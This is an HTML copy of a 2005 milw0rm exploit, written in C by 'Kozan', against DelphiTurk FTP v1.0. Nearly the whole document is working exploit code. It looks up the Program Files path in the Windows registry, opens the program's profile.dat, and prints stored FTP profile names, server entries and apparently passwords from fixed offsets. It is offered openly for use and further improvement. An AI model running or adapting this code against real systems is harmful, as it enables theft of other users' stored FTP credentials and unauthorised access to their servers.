<html><head><title>DelphiTurk FTP v1.0 Passwords to Local Users Exploit</title></head><pre>/*****************************************************************

DelphiTurk FTP v1.0 Local Exploit by Kozan

Application: DelphiTurk FTP v1.0
Procuder: Delphiturk.com and Delphikitabi.com
Vulnerable Description: DelphiTurk FTP v1.0 passwords to local users.


Coded by: Kozan
Web : www.netmagister.com
Web2: www.spyinstructors.com
Mail: kozan[at]netmagister[dot]com


*****************************************************************/

#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;


HKEY hKey;
#define BUFSIZE 100
char prgfiles[BUFSIZE];
DWORD dwBufLen=BUFSIZE;
LONG lRet;


char *bilgi_oku(int adres,int uzunluk)
{

if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion&quot;,
0,
KEY_QUERY_VALUE,
&amp;hKey) == ERROR_SUCCESS)
{

lRet = RegQueryValueEx( hKey, &quot;ProgramFilesDir&quot;, NULL, NULL,
(LPBYTE) prgfiles, &amp;dwBufLen);

if( (lRet != ERROR_SUCCESS) || (dwBufLen &gt; BUFSIZE) ){
RegCloseKey(hKey);
printf(&quot;An error occured!&quot;);
return 0;
}

RegCloseKey(hKey);

}else{
printf(&quot;An error occured!\n&quot;);
exit(1);
}

strcat(prgfiles,&quot;\\DelphiTurk\\Delphi T&amp;#65533;rk FTP\\profile.dat&quot;);

int i;
FILE *fp;
char ch[100];
if((fp=fopen(prgfiles,&quot;rb&quot;)) == NULL)
{
return &quot;false&quot;;
}
fseek(fp,adres,0);
for(i=0;i&lt;uzunluk;i++)
ch[i]=getc(fp);
ch[i]=NULL;
fclose(fp);
return ch;
}



int main()
{

printf(&quot;\r\n\r\nDelphiTurk FTP v1.0 Local Exploit by Kozan\n&quot;);
printf(&quot;www.netmagister.com - www.spyinstructors.com\r\n\r\n&quot;);
printf(&quot;This example exploit only shows the first record.\r\n&quot;);
printf(&quot;You may improve it freely...\r\n\r\n&quot;);
printf(&quot;ProfileName : %s\n&quot;,bilgi_oku(1,31));
printf(&quot;Ftp Server : %s\n&quot;,bilgi_oku(32,51));
printf(&quot;Ftp Server : %s\n&quot;,bilgi_oku(83,51));
printf(&quot;Ftp Server : %s\n&quot;,bilgi_oku(134,51));


return 0;


}

// milw0rm.com [2005-02-09]</pre></html>